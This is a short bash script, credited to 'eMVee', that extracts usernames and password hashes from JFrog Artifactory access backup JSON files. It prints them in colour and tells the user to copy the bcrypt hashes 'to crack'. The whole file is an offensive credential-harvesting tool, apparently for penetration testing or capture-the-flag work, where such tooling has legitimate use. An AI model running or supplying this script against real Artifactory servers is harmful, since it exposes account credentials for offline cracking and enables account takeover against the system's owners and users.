#!/bin/bash
echo -e "\033[1;32m"
echo -e "  #############################################################"
echo -e "  #        Artifactory Username and Passwords Hashes          #"
echo -e "  #                     Extraction Script                     #"
echo -e "  #                                                           #"
echo -e "  #                     Created by eMVee                      #"
echo -e "  #############################################################"
echo -e "\033[0m"

# Set the directory path
directory_path="/opt/jfrog/artifactory/var/backup/access/"

# Loop through each JSON file in the directory
for file in "$directory_path"*.json; do
  # Print the filename in green
  echo -e "\033[1;32mFile: $file\033[0m"

  # Extract the usernames from the file
  usernames=($(grep -o -e 'username" : "[^"]*"' -e 'username" : null' "$file" | sed -r 's/username" : "([^"]*)"/\1/; s/username" : null/null/'))

  # Extract the password hashes from the file
  password_hashes=($(grep -o -e 'password" : "[^"]*"' -e 'password" : null' "$file" | sed -r 's/password" : "([^"]*)"/\1/; s/password" : null/null/'))

  # Print the number of usernames and hashes found
  echo -e "\033[1;32mFound ${#usernames[@]} usernames and ${#password_hashes[@]} password hashes\033[0m"

  # Loop through each username and password hash
  for ((i=0; i<${#usernames[@]}; i++)); do
    # Check if the password hash is not null
    if [ "${password_hashes[$i]}" == "null" ]; then
      # Print the username and password hash in red, with the values in white
      echo -e "\033[1;31mUsername: \033[0;37m${usernames[$i]}\033[0;31m, Password Hash: \033[0;37mNULL\033[0;31m\033[0m"
    else
      if [[ "${password_hashes[$i]}" =~ ^bcrypt ]]; then
        # Extract the bcrypt hash
        bcrypt_hash=${password_hashes[$i]#bcrypt$}
        echo -e "\033[1;31mUsername: \033[0;37m${usernames[$i]}\033[0;31m, Password Hash: \033[0;37m${password_hashes[$i]}\033[0;31m\033[0m"
        echo -e "\033[1;31m[!] Copy the hash to crack: \033[0;37m$bcrypt_hash\033[0;31m\033[0m"
      else
        echo -e "\033[1;31mUsername: \033[0;37m${usernames[$i]}\033[0;31m, Password Hash: \033[0;37m${password_hashes[$i]}\033[0;31m\033[0m"
      fi
    fi
  done

  echo # Add an empty line between files
done
